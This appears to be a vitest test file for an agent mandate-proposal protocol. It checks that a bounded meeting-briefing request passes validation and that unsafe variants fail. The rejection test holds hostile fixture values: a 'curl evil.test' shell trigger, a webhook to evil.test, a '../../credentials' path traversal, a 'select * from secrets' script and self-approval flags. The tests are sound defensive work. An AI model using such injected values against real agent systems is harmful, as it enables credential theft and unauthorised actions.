import fs from 'node:fs';

import { describe, expect, it } from 'vitest';
import { validRequest } from './protocol.js';
import { MISSION_DEFAULT_LIMITS } from './mission-protocol.js';

const request = {
  protocol: 'cos-rpc/v1',
  request_id: '11111111-1111-4111-8111-111111111111',
  method: 'cos_mandate_propose',
  params: {
    change: {
      kind: 'standing_mandate',
      mandate_id: null,
      expected_version: 0,
      action: 'activate',
      reason: 'Prepare selected Pilot Alpha meetings within these limits.',
      definition: {
        title: 'Pilot Alpha meeting preparation',
        purpose: 'Prepare a private briefing using the selected calendar and project notes.',
        goal_id: 'pilot-goal',
        project_id: 'pilot-project',
        source_ids: ['pilot-notes'],
        calendar: {
          binding_id: '22222222-2222-4222-8222-222222222222',
          calendar_ids: ['pilot@example.test'],
          event_ids: ['pilot-review'],
        },
        template: 'meeting_preparation_v1',
        operation: 'prepare_private_briefing',
        trigger: { kind: 'event_approaching', look_ahead_minutes: 1440, max_matches: 1 },
        schedule: {
          state: 'active',
          time_zone: 'UTC',
          local_time: '08:00',
          weekdays: [1, 2, 3, 4, 5],
          quiet_hours: { start: '22:00', end: '07:00' },
          snooze_until: null,
        },
        output: 'originating_owner',
        notifications_per_day: 1,
        escalation_rule: null,
        limits: { ...MISSION_DEFAULT_LIMITS },
        budget: {
          max_missions: 2,
          max_attempts: 4,
          max_turns: 8,
          max_tool_calls: 48,
          max_concurrent_workers: 1,
          wall_seconds: 1200,
        },
        starts_at: '2026-10-04T00:00:00Z',
        review_at: '2026-10-10T00:00:00Z',
        expires_at: '2026-10-11T00:00:00Z',
        failure_policy: { max_failures: 2, unknown_usage: 'suspend', missed_occurrences: 'coalesce_latest' },
      },
    },
  },
};

describe('S08 typed mandate proposal boundary', () => {
  it('packages the same canonical mandate contract into the runner', () => {
    expect(fs.readFileSync('container/agent-runner/src/mcp-tools/generated/mandate-protocol.ts', 'utf8')).toBe(
      fs.readFileSync('src/modules/chief-of-staff/contracts/mandate-protocol.ts', 'utf8'),
    );
  });
  it('accepts a complete bounded meeting-preparation proposal without granting execution', () => {
    expect(validRequest(request)).toBe(true);
  });
  it('S08-T04/T07/T10 rejects executable triggers, permission expansion and external effects', () => {
    const definition = request.params.change.definition;
    for (const mutation of [
      { template: 'arbitrary_agent' },
      { operation: 'email_attendees' },
      { output: 'public-channel' },
      { source_ids: ['../../credentials'] },
      { trigger: { kind: 'event_approaching', look_ahead_minutes: 1440, max_matches: 1, shell: 'curl evil.test' } },
      { trigger: { kind: 'webhook', url: 'https://evil.test' } },
      { trigger: { kind: 'event_approaching', look_ahead_minutes: 100000, max_matches: 100 } },
      { limits: { ...definition.limits, max_concurrent_workers: 100 } },
      { budget: { ...definition.budget, max_turns: 0 } },
      { expires_at: '2027-10-11T00:00:00Z' },
      { failure_policy: { ...definition.failure_policy, unknown_usage: 'ignore' } },
      { owner_id: 'someone_else' },
      { approved: true },
      { script: 'select * from secrets' },
    ])
      expect(
        validRequest({
          ...request,
          params: { change: { ...request.params.change, definition: { ...definition, ...mutation } } },
        }),
      ).toBe(false);
  });
  it('does not expose trigger admission or worker authority as coordinator RPC', () => {
    for (const method of ['cos_mandate_trigger', 'cos_mandate_execute', 'cos_mandate_approve'])
      expect(validRequest({ ...request, method })).toBe(false);
  });
});
